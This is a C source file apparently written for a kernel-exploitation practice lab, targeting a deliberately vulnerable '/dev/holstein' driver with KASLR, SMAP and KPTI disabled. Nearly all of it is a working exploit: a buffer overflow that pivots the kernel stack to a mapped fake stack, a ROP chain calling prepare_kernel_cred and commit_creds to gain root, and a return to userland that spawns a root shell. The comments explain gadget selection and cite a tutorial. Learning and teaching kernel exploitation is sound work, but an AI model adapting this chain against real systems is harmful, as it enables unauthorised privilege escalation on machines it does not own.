/**
 * krop:
 *   - SMEP is enabled
 *   - SMAP is disabled
 *   - KASLR is disabled
 *   - KPTI is disabled
 *
 * [1] https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#pivoting-the-stack 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;

/*
 * Note: these gadgets are expressed in Intel syntax
 *
 * Example:
 * #define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
 * 
 *             0xffffffff8160c96b      4889c7         mov rdi, rax
 *             0xffffffff8160c96e      f348a5         rep movsq qword [rdi], qword [rsi]
 *             0xffffffff8160c971      c3             ret
 * 
 * The goal of this gadget is moving `rax` int `rdi` but there are no gadgets
 * that do directly:
 *
 * [cpey@nuc 04.krop]$ ropr vmlinux --noisy --nosys --nojop -R "mov rdi, rax; ret;"
 *  ==> Found 0 gadgets in 1.486 seconds
 * 
 *  rep movsq [rdi], [rsi]
 *  ----------------------
 * `rep` repeats the following string operation `ecx` times. `movsq` copies data from
 * `rsi` to `rdi` and increments or decrements the pointers based on the setting
 * of the direction flag. As such, repeating it will move a range of memory to
 * somewhere else. 
 * 
 * The rop chain is not interested on any of this, that is why this gadget is
 * preceded with a gadget that sets `rcx` to 0, so no move operation happens.
 *
 */

#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds        0xffffffff8106e390
#define rop_pop_rdi               0xffffffff8127bbdc
#define rop_pop_rcx               0xffffffff8132cdd3
#define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
#define rop_swapgs                0xffffffff8160bf7e
#define rop_iretq                 0xffffffff810202af
#define mov_esp_pop2_ret    	  0xffffffff812bbca5 // mov esp, 0x5b000000; pop r12; pop rbp; ret;

unsigned long *fake_stack;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

void build_fake_stack(void) {
  fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000,
			PROT_READ|PROT_WRITE|PROT_EXEC,
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
  unsigned off = 0x1000;
  unsigned long *chain = (unsigned long*) ((unsigned long) fake_stack + off);
  fake_stack[0] = 0xdead; // put something in the first page so that it gets mapped
  *chain++ = 0x0; // dummy r12
  *chain++ = 0x0; // dummy rbp
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = rop_swapgs;
  *chain++ = rop_iretq;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();
  build_fake_stack();

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  char buf[0x500];
  memset(buf, 'A', 0x408);
  unsigned long *chain = (unsigned long*)&buf[0x408];
  *chain++ = mov_esp_pop2_ret;
  write(fd, buf, (void*)chain - (void*)buf);

  close(fd);
  return 0;
}
